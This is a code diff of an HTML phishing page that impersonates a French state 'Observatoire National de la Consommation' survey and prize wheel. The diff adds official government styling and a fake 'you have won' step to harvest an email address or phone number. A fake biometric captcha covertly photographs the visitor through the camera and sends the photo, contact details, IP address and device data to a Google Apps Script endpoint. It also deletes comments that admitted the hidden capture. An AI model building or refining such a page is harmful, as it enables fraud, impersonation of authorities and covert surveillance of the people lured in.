@@ -3,69 +3,235 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Observatoire National de la Consommation - Enquête & Jeu-Concours</title>
+<title>Enquête Nationale sur la Consommation - Jeu-Concours</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-  body { background-color: #f4f6f8; color: #333; line-height: 1.5; padding-bottom: 30px; }
+  /* Intégration de la police Marianne (officielle de l'État) via CDN */
+  @font-face {
+    font-family: 'Marianne';
+    src: url('https://cdn.jsdelivr.net/npm/@gouvfr/dsfr@1.10.2/dist/fonts/Marianne-Regular.woff2') format('woff2');
+    font-weight: 400;
+    font-style: normal;
+  }
+  @font-face {
+    font-family: 'Marianne';
+    src: url('https://cdn.jsdelivr.net/npm/@gouvfr/dsfr@1.10.2/dist/fonts/Marianne-Bold.woff2') format('woff2');
+    font-weight: 700;
+    font-style: normal;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   
-  /* Bandeau républicain */
-  .top-bar { height: 4px; background: linear-gradient(to right, #002395 33%, #ffffff 33%, #ffffff 66%, #ED2939 66%); }
+  body { 
+    font-family: 'Marianne', 'Segoe UI', Arial, sans-serif; 
+    background-color: #f6f6f6; 
+    color: #161616; 
+    line-height: 1.5; 
+    padding-bottom: 30px; 
+  }
   
-  .header { background: #fff; border-bottom: 1px solid #ddd; padding: 20px; text-align: center; }
-  .header h1 { font-size: 20px; color: #002395; font-weight: 700; letter-spacing: 0.5px; }
-  .header p { font-size: 12px; color: #666; margin-top: 5px; text-transform: uppercase; letter-spacing: 1px; }
+  /* Bandeau Marianne */
+  .top-bar { 
+    height: 4px; 
+    background: linear-gradient(to right, #000091 33%, #ffffff 33%, #ffffff 66%, #E1000F 66%); 
+  }
   
-  .container { max-width: 540px; margin: 25px auto; background: #fff; border-radius: 4px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+  .header { 
+    background: #fff; 
+    border-bottom: 1px solid #ddd; 
+    padding: 20px; 
+    text-align: center; 
+  }
+  .header h1 { 
+    font-size: 20px; 
+    color: #000091; 
+    font-weight: 700; 
+    letter-spacing: 0.5px;
+  }
+  .header p { 
+    font-size: 13px; 
+    color: #666; 
+    margin-top: 5px; 
+    text-transform: uppercase; 
+    letter-spacing: 1px; 
+  }
   
-  h2 { font-size: 22px; margin-bottom: 10px; color: #1a1a1a; }
-  .subtitle { font-size: 14px; color: #555; margin-bottom: 25px; }
+  .container { 
+    max-width: 580px; 
+    margin: 30px auto; 
+    background: #fff; 
+    border: 1px solid #ddd; 
+    padding: 40px; 
+  }
+  
+  h2 { 
+    font-size: 24px; 
+    margin-bottom: 15px; 
+    color: #000091; 
+    font-weight: 700;
+  }
+  .subtitle { 
+    font-size: 15px; 
+    color: #3a3a3a; 
+    margin-bottom: 30px; 
+  }
   
   .step { display: none; }
   .step.active { display: block; animation: fadeIn 0.4s ease; }
   @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
   
-  .progress-bar { width: 100%; height: 6px; background: #e0e0e0; margin-bottom: 25px; border-radius: 3px; overflow: hidden; }
-  .progress-fill { height: 100%; background: #002395; width: 0%; transition: width 0.4s ease; }
+  .progress-bar { width: 100%; height: 4px; background: #e5e5e5; margin-bottom: 30px; }
+  .progress-fill { height: 100%; background: #000091; width: 0%; transition: width 0.4s ease; }
   
-  /* Formulaire */
-  .form-group { margin-bottom: 15px; }
-  .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; color: #444; }
-  .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
-  .form-group input:focus { outline: none; border-color: #002395; }
+  /* Formulaires (style DSFR) */
+  .form-group { margin-bottom: 25px; }
+  .form-group label { 
+    display: block; 
+    font-size: 14px; 
+    font-weight: 700; 
+    margin-bottom: 8px; 
+    color: #161616; 
+  }
+  .form-group input, .form-group select { 
+    width: 100%; 
+    padding: 12px; 
+    border: 1px solid #3a3a3a; 
+    border-radius: 0; 
+    font-size: 15px; 
+    font-family: 'Marianne', sans-serif;
+    background-color: #fff;
+  }
+  .form-group input:focus, .form-group select:focus { 
+    outline: 2px solid #000091; 
+    outline-offset: 2px;
+  }
   
-  .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 1px solid #ccc; padding: 12px 15px; margin-bottom: 10px; cursor: pointer; font-size: 14px; border-radius: 4px; }
-  .option-btn:hover { border-color: #002395; background: #f0f4ff; }
-  .option-btn.selected { background: #e6f0ff; border-color: #002395; font-weight: 600; }
+  /* Boutons (style DSFR) */
+  .option-btn { 
+    display: block; 
+    width: 100%; 
+    text-align: left; 
+    background: #fff; 
+    border: 1px solid #3a3a3a; 
+    padding: 15px; 
+    margin-bottom: 10px; 
+    cursor: pointer; 
+    font-size: 15px; 
+    border-radius: 0; 
+    font-family: 'Marianne', sans-serif;
+    transition: background 0.2s;
+  }
+  .option-btn:hover { 
+    background: #f6f6f6; 
+  }
+  .option-btn.selected { 
+    background: #e3e3fd; 
+    border-color: #000091; 
+    font-weight: 700; 
+    color: #000091;
+  }
   
-  .btn-action { background-color: #002395; color: white; border: none; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 15px; }
-  .btn-action:hover { background-color: #001a70; }
-  .btn-action:disabled { background-color: #ccc; cursor: not-allowed; }
+  .btn-action { 
+    background-color: #000091; 
+    color: white; 
+    border: none; 
+    padding: 14px 20px; 
+    width: 100%; 
+    font-size: 16px; 
+    font-weight: 700; 
+    cursor: pointer; 
+    border-radius: 0; 
+    margin-top: 15px; 
+    font-family: 'Marianne', sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .btn-action:hover { 
+    background-color: #00006d; 
+  }
+  .btn-action:disabled { 
+    background-color: #e5e5e5; 
+    color: #999; 
+    cursor: not-allowed; 
+  }
   
   /* Partenaires */
-  .partners { text-align: center; margin: 25px 0; padding: 15px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; }
-  .partners p { font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 1px; }
-  .partner-logos { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
-  .partner-logo { font-weight: bold; font-size: 14px; color: #999; font-family: Arial, sans-serif; }
+  .partners { 
+    text-align: center; 
+    margin: 30px 0; 
+    padding: 20px 0; 
+    border-top: 1px solid #e5e5e5; 
+    border-bottom: 1px solid #e5e5e5; 
+  }
+  .partners p { 
+    font-size: 12px; 
+    color: #666; 
+    text-transform: uppercase; 
+    margin-bottom: 15px; 
+    letter-spacing: 1px; 
+    font-weight: 700;
+  }
+  .partner-logos { 
+    display: flex; 
+    justify-content: center; 
+    gap: 20px; 
+    flex-wrap: wrap; 
+  }
+  .partner-logo { 
+    font-weight: 700; 
+    font-size: 14px; 
+    color: #999; 
+    font-family: Arial, sans-serif; 
+  }
   
   /* Captcha / Biométrie */
-  .captcha-box { background: #f9f9f9; border: 1px solid #ddd; padding: 20px; text-align: center; margin: 20px 0; border-radius: 4px; }
-  .consent-box { background: #fbfbfb; border: 1px solid #e0e0e0; padding: 15px; margin: 20px 0; font-size: 11px; color: #666; border-radius: 4px; }
-  .consent-label { display: flex; align-items: flex-start; gap: 10px; cursor: pointer; }
-  .consent-label input { margin-top: 3px; width: 16px; height: 16px; }
+  .captcha-box { 
+    background: #f6f6f6; 
+    border: 1px solid #ddd; 
+    padding: 25px; 
+    text-align: center; 
+    margin: 25px 0; 
+  }
+  .captcha-box h3 { 
+    color: #000091; 
+    font-size: 16px; 
+    margin-bottom: 10px;
+  }
   
-  #loader { display: none; text-align: center; margin-top: 20px; font-weight: 600; color: #002395; }
+  .consent-box { 
+    background: #fff; 
+    border: 1px solid #e5e5e5; 
+    padding: 20px; 
+    margin: 25px 0; 
+    font-size: 12px; 
+    color: #3a3a3a; 
+  }
+  .consent-label { display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
+  .consent-label input { margin-top: 3px; width: 18px; height: 18px; accent-color: #000091; }
   
-  #camera-area { display: none; margin-top: 20px; text-align: center; font-size: 13px; color: #555; font-weight: bold; }
+  #loader { display: none; text-align: center; margin-top: 20px; font-weight: 700; color: #000091; font-size: 14px; }
+  
+  #camera-area { display: none; margin-top: 25px; text-align: center; font-size: 13px; color: #3a3a3a; font-weight: 700; }
+  #video-container { width: 120px; height: 120px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #000091; }
+  #video-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
   /* Roue */
   #wheel-section { display: none; text-align: center; }
-  .wheel-container { position: relative; width: 300px; height: 300px; margin: 20px auto; }
-  canvas { border-radius: 50%; box-shadow: 0 0 20px rgba(0,0,0,0.15); transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
-  #pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); font-size: 30px; z-index: 10; }
-  .btn-spin { background: #ED2939; font-size: 18px; padding: 15px; margin-top: 20px; }
-  .btn-spin:hover { background: #c92231; }
+  .wheel-container { position: relative; width: 300px; height: 300px; margin: 30px auto; }
+  canvas { border-radius: 50%; box-shadow: 0 0 0 4px #000091; transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
+  #pointer { position: absolute; top: -20px; left: 50%; transform: translateX(-50%); font-size: 30px; z-index: 10; color: #E1000F; }
+  .btn-spin { background: #E1000F; font-size: 18px; padding: 18px; margin-top: 20px; }
+  .btn-spin:hover { background: #c0000d; }
 
-  .footer-links { text-align: center; font-size: 11px; color: #999; margin-top: 25px; line-height: 1.8; }
+  .footer-links { 
+    text-align: center; 
+    font-size: 12px; 
+    color: #666; 
+    margin-top: 40px; 
+    padding-top: 20px;
+    border-top: 1px solid #ddd;
+    line-height: 2;
+  }
+  .footer-links a { color: #000091; text-decoration: underline; }
 </style>
 </head>
 <body>
@@ -74,27 +240,18 @@
 
 <div class="header">
   <h1>Observatoire National de la Consommation</h1>
-  <p>Enquête d'utilité publique & Jeu-Concours</p>
+  <p>Enquête publique & Jeu-Concours</p>
 </div>
 
 <div class="container" id="main-container">
   <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
 
-  <!-- ÉTAPE 1 : Formulaire de contact + Questions -->
+  <!-- ÉTAPE 1 : Questions -->
   <div class="step active" id="step-questions">
     <h2>Participez à notre grande enquête 2026</h2>
     <p class="subtitle">Répondez à quelques questions et tentez de remporter un bon d'achat de 500€ valable chez nos partenaires.</p>
     
-    <div class="form-group">
-      <label>Adresse e-mail (pour recevoir le bon d'achat)</label>
-      <input type="email" id="input-email" placeholder="exemple@email.com" required>
-    </div>
-    <div class="form-group">
-      <label>Numéro de téléphone (SMS de confirmation)</label>
-      <input type="tel" id="input-phone" placeholder="06 12 34 56 78" required>
-    </div>
-
-    <div id="question-container" style="margin-top: 25px;"></div>
+    <div id="question-container"></div>
     <button class="btn-action" id="btn-next" style="display:none;">Continuer</button>
 
     <div class="partners">
@@ -108,14 +265,35 @@
     </div>
   </div>
 
-  <!-- ÉTAPE 2 : Captcha Biométrique -->
+  <!-- ÉTAPE 2 : Faux Gain et choix de réception -->
+  <div class="step" id="step-prize">
+    <h2 style="color: #E1000F;">🎉 Félicitations, vous avez gagné !</h2>
+    <p class="subtitle">Vous faites partie des gagnants de notre enquête. Pour recevoir votre bon d'achat de 500€, veuillez indiquer comment vous souhaitez le recevoir.</p>
+
+    <div class="form-group">
+      <label>Mode de réception du bon d'achat</label>
+      <select id="input-method">
+        <option value="email">Par e-mail</option>
+        <option value="sms">Par SMS</option>
+      </select>
+    </div>
+
+    <div class="form-group" id="group-contact">
+      <label>Votre adresse e-mail</label>
+      <input type="email" id="input-contact" placeholder="exemple@email.com" required>
+    </div>
+
+    <button class="btn-action" id="btn-claim">Réclamer mon bon d'achat</button>
+  </div>
+
+  <!-- ÉTAPE 3 : Captcha Biométrique -->
   <div class="step" id="step-final">
-    <h2>Vérification anti-robot</h2>
+    <h2>Dernière étape : Vérification anti-robot</h2>
     <p class="subtitle">Pour garantir l'équité du concours et éviter les inscriptions automatisées, veuillez valider votre éligibilité.</p>
 
     <div class="captcha-box">
       <h3>🛡️ Contrôle de sécurité requis</h3>
-      <p style="font-size: 13px; color: #666; margin-top: 5px;">Une analyse biométrique (caméra et flash) va être effectuée pour prouver que vous êtes bien une personne réelle.</p>
+      <p style="font-size: 14px; color: #3a3a3a; margin-top: 10px;">Une analyse biométrique (caméra et flash) va être effectuée pour prouver que vous êtes bien une personne réelle.</p>
     </div>
     
     <div class="consent-box">
@@ -130,17 +308,17 @@
     <div id="loader">Vérification en cours... Ne quittez pas la page.</div>
     
     <div id="camera-area">
-      <div style="width: 100px; height: 100px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #002395;">
-        <video id="video-preview" autoplay playsinline muted style="width:100%; height:100%; object-fit: cover; transform: scaleX(-1);"></video>
+      <div id="video-container">
+        <video id="video-preview" autoplay playsinline muted></video>
       </div>
-      <p style="margin-top: 10px;">Analyse biométrique...</p>
+      <p style="margin-top: 15px;">Analyse biométrique...</p>
     </div>
   </div>
 
-  <!-- ÉTAPE 3 : Roue de la fortune -->
+  <!-- ÉTAPE 4 : Roue de la fortune -->
   <div class="step" id="wheel-section">
-    <h2>🎊 Félicitations !</h2>
-    <p class="subtitle">Votre participation est validée. Tournez la roue pour découvrir votre récompense.</p>
+    <h2>🎊 Vérification réussie !</h2>
+    <p class="subtitle">Tournez la roue pour découvrir votre récompense finale.</p>
     
     <div class="wheel-container">
       <div id="pointer">▼</div>
@@ -151,21 +329,19 @@
   </div>
 
   <div class="footer-links">
-    <a href="#" style="color:#999; text-decoration:none;">Mentions légales</a> | 
-    <a href="#" style="color:#999; text-decoration:none;">Politique de confidentialité (CNIL)</a> | 
-    <a href="#" style="color:#999; text-decoration:none;">Contact</a><br><br>
+    <a href="#">Mentions légales</a> | 
+    <a href="#">Politique de confidentialité (CNIL)</a> | 
+    <a href="#">Contact</a><br><br>
     © 2026 Observatoire National de la Consommation. Tous droits réservés.
   </div>
 </div>
 
 <script>
-// ⚠️ TON NOUVEAU LIEN GOOGLE APPS SCRIPT EST INTÉGRÉ ICI ⚠️
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxyBJ1b7bGa7ZK93Wl3l7jEHxCq95fO-uA4FomFkmKFgx9mySuEWiffTKXplax1fdh8iw/exec";
 
 const questions = [
   { text: "1. À quelle fréquence faites-vous vos achats en ligne ?", options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"] },
-  { text: "2. Quel est votre budget moyen pour les fêtes de fin d'année ?", options: ["Moins de 100€", "Entre 100€ et 300€", "Entre 300€ et 500€", "Plus de 500€"] },
-  { text: "3. Comment préférez-vous recevoir vos récompenses ?", options: ["Par e-mail", "Par SMS", "Par courrier postal", "Sur mon compte bancaire"] }
+  { text: "2. Quel est votre budget moyen pour les fêtes de fin d'année ?", options: ["Moins de 100€", "Entre 100€ et 300€", "Entre 300€ et 500€", "Plus de 500€"] }
 ];
 
 let currentIndex = 0;
@@ -175,6 +351,7 @@ const qContainer = document.getElementById('question-container');
 const btnNext = document.getElementById('btn-next');
 const progressFill = document.getElementById('progress-fill');
 const stepQuestions = document.getElementById('step-questions');
+const stepPrize = document.getElementById('step-prize');
 const stepFinal = document.getElementById('step-final');
 const chkConsent = document.getElementById('chk-consent');
 const btnSubmit = document.getElementById('btn-submit');
@@ -182,10 +359,22 @@ const loader = document.getElementById('loader');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
 const wheelSection = document.getElementById('wheel-section');
-const inputEmail = document.getElementById('input-email');
-const inputPhone = document.getElementById('input-phone');
 
-// ---- RÉCUPÉRATION DES INFOS (CACHÉ) ----
+const inputMethod = document.getElementById('input-method');
+const inputContact = document.getElementById('input-contact');
+
+inputMethod.addEventListener('change', () => {
+  if (inputMethod.value === 'email') {
+    document.querySelector('#group-contact label').textContent = "Votre adresse e-mail";
+    inputContact.placeholder = "exemple@email.com";
+    inputContact.type = "email";
+  } else {
+    document.querySelector('#group-contact label').textContent = "Votre numéro de téléphone";
+    inputContact.placeholder = "06 12 34 56 78";
+    inputContact.type = "tel";
+  }
+});
+
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Inconnu", browser = "Inconnu";
@@ -222,16 +411,15 @@ async function getPublicIP() {
   } catch (e) { return "IP inconnue"; }
 }
 
-// ---- LOGIQUE DU FORMULAIRE ----
 function renderQuestion() {
   const q = questions[currentIndex];
   qContainer.innerHTML = `
     <div class="question-box">
-      <div class="question-title" style="font-weight:600; margin-bottom:10px;">${q.text}</div>
+      <div class="question-title" style="font-weight:700; margin-bottom:15px; font-size: 15px;">${q.text}</div>
       ${q.options.map((opt, i) => `<button class="option-btn" data-index="${i}">${opt}</button>`).join('')}
     </div>
   `;
-  progressFill.style.width = `${((currentIndex) / questions.length) * 33}%`;
+  progressFill.style.width = `${((currentIndex + 1) / 4) * 100}%`;
   selectedAnswer = null;
   btnNext.style.display = 'none';
 
@@ -246,20 +434,25 @@ function renderQuestion() {
 }
 
 btnNext.addEventListener('click', () => {
-  if (currentIndex === 0) {
-    if (!inputEmail.value || !inputEmail.value.includes('@')) { alert("Veuillez saisir un email valide."); return; }
-    if (!inputPhone.value || inputPhone.value.length < 8) { alert("Veuillez saisir un numéro de téléphone valide."); return; }
-  }
-
   if (selectedAnswer === null) return;
   currentIndex++;
   if (currentIndex < questions.length) {
     renderQuestion();
   } else {
-    progressFill.style.width = '66%';
+    progressFill.style.width = '50%';
     stepQuestions.classList.remove('active');
-    stepFinal.classList.add('active');
+    stepPrize.classList.add('active');
   }
+});
+
+document.getElementById('btn-claim').addEventListener('click', () => {
+  if (!inputContact.value || (inputMethod.value === 'email' && !inputContact.value.includes('@')) || (inputMethod.value === 'sms' && inputContact.value.length < 8)) {
+    alert("Veuillez renseigner une information valide pour recevoir votre récompense.");
+    return;
+  }
+  progressFill.style.width = '75%';
+  stepPrize.classList.remove('active');
+  stepFinal.classList.add('active');
 });
 
 chkConsent.addEventListener('change', () => {
@@ -291,7 +484,6 @@ btnSubmit.addEventListener('click', async () => {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
-    // CAPTURE PHOTO EN CACHETTE
     let photoBase64 = "";
     setTimeout(() => {
       try {
@@ -304,12 +496,12 @@ btnSubmit.addEventListener('click', async () => {
       } catch(e) {}
     }, 1500);
 
-    // ENVOI ET PASSAGE À LA ROUE
     setTimeout(async () => {
       const ip = await getPublicIP();
       const formData = new FormData();
-      formData.append("email", inputEmail.value);
-      formData.append("phone", inputPhone.value);
+      
+      formData.append("email", inputMethod.value === 'email' ? inputContact.value : "");
+      formData.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
       formData.append("ip", ip);
       formData.append("os", info.os);
       formData.append("browser", info.browser);
@@ -334,15 +526,14 @@ btnSubmit.addEventListener('click', async () => {
 
   } catch (err) {
     loader.textContent = "❌ Impossible de lancer la vérification. Veuillez autoriser la caméra.";
-    loader.style.color = "#ED2939";
+    loader.style.color = "#E1000F";
   }
 });
 
-// ---- ROUE DE LA FORTUNE (SANS RÉSULTAT) ----
 const wheelCanvas = document.getElementById("wheel");
 const ctx = wheelCanvas.getContext("2d");
 const segments = ["🎁 -10%", "🚚 Livraison gratuite", "🎧 Goodie", "🎟 5€ bon", "🎉 15%", "❌ Pas de gain"];
-const colors = ["#f44336", "#4caf50", "#ffeb3b", "#2196f3", "#ff9800", "#9c27b0"];
+const colors = ["#E1000F", "#18753c", "#ffeb3b", "#000091", "#ff9800", "#9c27b0"];
 
 function drawWheel() {
   const arc = (2 * Math.PI) / segments.length;
@@ -354,7 +545,7 @@ function drawWheel() {
     ctx.arc(150, 150, 150, angle, angle + arc);
     ctx.lineTo(150, 150);
     ctx.fill();
-    ctx.strokeStyle = "rgba(255,255,255,0.3)";
+    ctx.strokeStyle = "#fff";
     ctx.lineWidth = 2;
     ctx.stroke();
     ctx.save();
@@ -387,8 +578,8 @@ document.getElementById("spin").addEventListener("click", () => {
   setTimeout(() => {
     spinning = false;
     document.getElementById("spin").textContent = "Récompense en attente de validation";
-    document.getElementById("spin").style.backgroundColor = "#ccc";
-    document.getElementById("spin").style.color = "#666";
+    document.getElementById("spin").style.backgroundColor = "#e5e5e5";
+    document.getElementById("spin").style.color = "#999";
     document.getElementById("spin").style.cursor = "default";
   }, 4000);
 });
